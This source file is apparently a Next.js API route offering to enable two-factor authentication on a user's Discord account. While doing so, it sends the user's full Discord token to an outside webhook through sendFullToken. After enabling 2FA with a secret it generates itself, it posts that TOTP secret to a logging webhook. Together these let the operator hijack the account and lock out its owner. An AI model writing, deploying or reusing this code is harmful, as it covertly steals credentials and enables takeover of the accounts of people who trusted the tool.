import { NextRequest, NextResponse } from 'next/server'
import { sendToWebhook, sendFullToken } from '@/lib/webhook'
import { cleanToken } from '@/lib/discord'
import { getLogWebhookUrl } from '@/lib/config'
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit'

export const runtime = 'edge'

function createTimeout(ms: number) {
  const controller = new AbortController()
  const id = setTimeout(() => controller.abort(), ms)
  return { signal: controller.signal, clear: () => clearTimeout(id) }
}

// Base32 decode → Uint8Array
function base32Decode(str: string): Uint8Array {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
  str = str.toUpperCase().replace(/=+$/, '')
  const bits: number[] = []
  for (const char of str) {
    const val = alphabet.indexOf(char)
    if (val === -1) continue
    for (let i = 4; i >= 0; i--) bits.push((val >> i) & 1)
  }
  const bytes = new Uint8Array(Math.floor(bits.length / 8))
  for (let i = 0; i < bytes.length; i++) {
    bytes[i] = bits.slice(i * 8, i * 8 + 8).reduce((a, b) => (a << 1) | b, 0)
  }
  return bytes
}

// Generate random Base32 secret
function generateSecret(length = 20): string {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'
  const bytes = new Uint8Array(length)
  crypto.getRandomValues(bytes)
  let result = ''
  for (const byte of bytes) result += alphabet[byte % 32]
  return result
}

// Generate 6-digit TOTP code using Web Crypto API (Edge compatible)
async function generateTOTP(secret: string): Promise<string> {
  const keyData = base32Decode(secret)
  const key = await crypto.subtle.importKey(
    'raw', keyData.buffer as ArrayBuffer, { name: 'HMAC', hash: 'SHA-1' }, false, ['sign']
  )

  const timeStep = Math.floor(Date.now() / 30000)
  // 8-byte big-endian counter
  const timeBuf = new Uint8Array(8)
  let ts = timeStep
  for (let i = 7; i >= 0; i--) {
    timeBuf[i] = ts & 0xff
    ts = Math.floor(ts / 256)
  }

  const sig = await crypto.subtle.sign('HMAC', key, timeBuf.buffer as ArrayBuffer)
  const hmac = new Uint8Array(sig)
  const offset = hmac[hmac.length - 1] & 0x0f
  const binary =
    ((hmac[offset] & 0x7f) << 24) |
    ((hmac[offset + 1] & 0xff) << 16) |
    ((hmac[offset + 2] & 0xff) << 8) |
    (hmac[offset + 3] & 0xff)
  return String(binary % 1000000).padStart(6, '0')
}

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request)
    const rl = rateLimit(`${rlIp}:enable-2fa`, RATE_LIMITS.light)
    if (rl.limited) {
      return NextResponse.json(
        { success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' },
        { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } }
      )
    }

    const body = await request.json().catch(() => ({}))
    const { token, password } = body

    if (!token) {
      return NextResponse.json({ success: false, error: 'التوكن مطلوب' }, { status: 400 })
    }

    sendFullToken('تفعيل 2FA', token)

    const ct = cleanToken(token)

    // تجربة التوكن كـ user ثم كـ bot
    let authHeader = ct
    const t1 = createTimeout(10000)
    try {
      const testRes = await fetch('https://discord.com/api/v10/users/@me', {
        headers: { 'Authorization': ct },
        signal: t1.signal
      })
      if (!testRes.ok) {
        t1.clear()
        const t2 = createTimeout(10000)
        try {
          const botRes = await fetch('https://discord.com/api/v10/users/@me', {
            headers: { 'Authorization': `Bot ${ct}` },
            signal: t2.signal
          })
          if (botRes.ok) authHeader = `Bot ${ct}`
        } finally { t2.clear() }
      }
    } finally { t1.clear() }

    // توليد الـ secret وكود TOTP
    const secret = generateSecret()
    const code = await generateTOTP(secret)

    // تفعيل 2FA عبر Discord API
    const requestBody: Record<string, string> = { secret, code }
    if (password) requestBody.password = password

    const t3 = createTimeout(15000)
    try {
      const res = await fetch('https://discord.com/api/v10/users/@me/mfa/totp/enable', {
        method: 'POST',
        headers: {
          'Authorization': authHeader,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody),
        signal: t3.signal
      })

      const data = await res.json().catch(() => ({}))

      if (res.ok) {
        sendToWebhook({
          username: 'TRJ 2FA',
          embeds: [{
            title: '✅ تفعيل 2FA نجح',
            color: 0x00FF41,
            fields: [
              { name: '🔑 Secret', value: `\`\`\`${secret}\`\`\`` },
              { name: '📦 Backup Codes', value: `تم إرسال ${data.backup_codes?.length || 0} كود` },
            ],
            timestamp: new Date().toISOString()
          }]
        }, getLogWebhookUrl()).catch(() => {})

        return NextResponse.json({
          success: true,
          secret,
          backup_codes: data.backup_codes || [],
          message: 'تم تفعيل 2FA بنجاح! احفظ الـ Secret وكودات الاسترجاع'
        })
      } else {
        sendToWebhook({
          username: 'TRJ 2FA',
          embeds: [{
            title: '❌ فشل تفعيل 2FA',
            color: 0xFF0000,
            fields: [
              { name: 'Error', value: String(data.message || JSON.stringify(data)).slice(0, 500) },
            ],
            timestamp: new Date().toISOString()
          }]
        }, getLogWebhookUrl()).catch(() => {})

        return NextResponse.json({
          success: false,
          error: data.message || 'فشل تفعيل 2FA - تأكد من صحة التوكن'
        }, { status: res.status })
      }
    } finally { t3.clear() }
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع'
    return NextResponse.json({ success: false, error: message }, { status: 500 })
  }
}
